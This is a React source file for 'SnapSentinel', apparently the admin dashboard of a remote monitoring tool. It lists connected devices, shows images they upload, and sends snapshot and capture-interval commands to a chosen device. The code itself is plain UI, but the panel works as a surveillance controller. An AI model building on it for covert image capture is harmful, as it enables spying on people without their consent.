import React, { useEffect, useState, useRef } from 'react';
import io from 'socket.io-client';
import { format } from 'date-fns';

const SERVER_URL = 'http://localhost:3000';

function App() {
    const [socket, setSocket] = useState(null);
    const [clients, setClients] = useState({});
    const [selectedClientId, setSelectedClientId] = useState(null);
    const [feed, setFeed] = useState([]); // Array of { url, timestamp, generated }
    const [isConnected, setIsConnected] = useState(false);

    // Connection
    useEffect(() => {
        const newSocket = io(SERVER_URL);
        setSocket(newSocket);

        newSocket.on('connect', () => setIsConnected(true));
        newSocket.on('disconnect', () => setIsConnected(false));

        newSocket.on('clients_update', (updatedClients) => {
            setClients(updatedClients);
        });

        newSocket.on('new_image', (data) => {
            // data: { clientId, imageUrl, filename, timestamp }
            setFeed(prev => {
                // If user viewing this client or 'All' (optional future feature), add to feed
                // Ideally we filter by selectedClientId in render or here. 
                // For simplicity let's keep all in feed state but filter in UI, or filtered state.
                return [data, ...prev];
            });
        });

        return () => newSocket.disconnect();
    }, []);

    const sendCommand = (command, payload = {}) => {
        if (!socket || !selectedClientId) return;
        socket.emit('admin_command', {
            targetClientId: selectedClientId,
            command,
            payload
        });
    };

    const selectedClient = clients[selectedClientId];

    // Filter images for selected client
    const clientImages = feed.filter(img => img.clientId === selectedClientId);

    return (
        <div className="grid-layout">
            {/* Sidebar - Client List */}
            <div className="sidebar">
                <div style={{ marginBottom: 20 }}>
                    <h3>SnapSentinel</h3>
                    <p style={{ fontSize: 12, color: 'var(--text-secondary)' }}>
                        Admin Console • {isConnected ? 'Online' : 'Offline'}
                    </p>
                </div>

                <div style={{ fontWeight: 600, fontSize: 12, color: 'var(--text-dim)', marginBottom: 8 }}>
                    CONNECTED DEVICES
                </div>

                {Object.keys(clients).length === 0 && (
                    <div style={{ fontSize: 13, color: 'var(--text-dim)', fontStyle: 'italic' }}>
                        No devices found.
                    </div>
                )}

                {Object.entries(clients).map(([id, client]) => (
                    <div
                        key={id}
                        className={`client-item ${selectedClientId === id ? 'active' : ''}`}
                        onClick={() => setSelectedClientId(id)}
                    >
                        <div>
                            <div style={{ fontWeight: 500 }}>{id.substring(0, 8)}...</div>
                            <div style={{ fontSize: 11 }}>{client.os || 'Unknown OS'}</div>
                        </div>
                        <div className={`status-dot ${client.status === 'online' ? 'online' : ''}`} />
                    </div>
                ))}
            </div>

            {/* Main Content */}
            <div className="content">
                {!selectedClientId ? (
                    <div style={{ display: 'flex', height: '100%', alignItems: 'center', justifyContent: 'center', color: 'var(--text-dim)', flexDirection: 'column', gap: 10 }}>
                        <h3>Select a device to monitor</h3>
                        <p>Select a client from the sidebar to view live feed and controls.</p>
                    </div>
                ) : (
                    <div>
                        {/* Header */}
                        <div className="header">
                            <div>
                                <h2>Device: {selectedClientId}</h2>
                                <div style={{ display: 'flex', gap: 10, marginTop: 4, fontSize: 12, color: 'var(--text-secondary)' }}>
                                    <span>Status: <span style={{ color: selectedClient?.status === 'online' ? '#fff' : '#666' }}>{selectedClient?.status}</span></span>
                                    <span>Last Seen: {selectedClient?.lastSeen ? format(new Date(selectedClient.lastSeen), 'HH:mm:ss') : 'N/A'}</span>
                                    <span>Version: {selectedClient?.version}</span>
                                </div>
                            </div>

                            <div style={{ display: 'flex', gap: 8 }}>
                                <button onClick={() => sendCommand('capture')}>
                                    Trigger Snapshot
                                </button>
                                <button onClick={() => {
                                    const minutes = prompt("Enter interval in minutes:", "5");
                                    if (minutes) sendCommand('set_interval', { interval: parseInt(minutes) * 60 * 1000 });
                                }}>
                                    Set Interval
                                </button>
                            </div>
                        </div>

                        {/* Image Grid */}
                        <h4 style={{ marginBottom: 16 }}>Captured Feed</h4>
                        {clientImages.length === 0 ? (
                            <div style={{ padding: 40, textAlign: 'center', border: '1px dashed var(--border)', borderRadius: 8, color: 'var(--text-dim)' }}>
                                No images received yet.
                            </div>
                        ) : (
                            <div className="image-grid">
                                {clientImages.map((img, idx) => (
                                    <div key={idx} className="image-card">
                                        <img src={img.imageUrl} alt="Snap" />
                                        <div className="image-meta">
                                            <div>{format(new Date(img.timestamp), 'MMM dd, HH:mm:ss')}</div>
                                            <div style={{ fontSize: 10, color: '#666' }}>{img.filename}</div>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}
                    </div>
                )}
            </div>
        </div>
    )
}

export default App
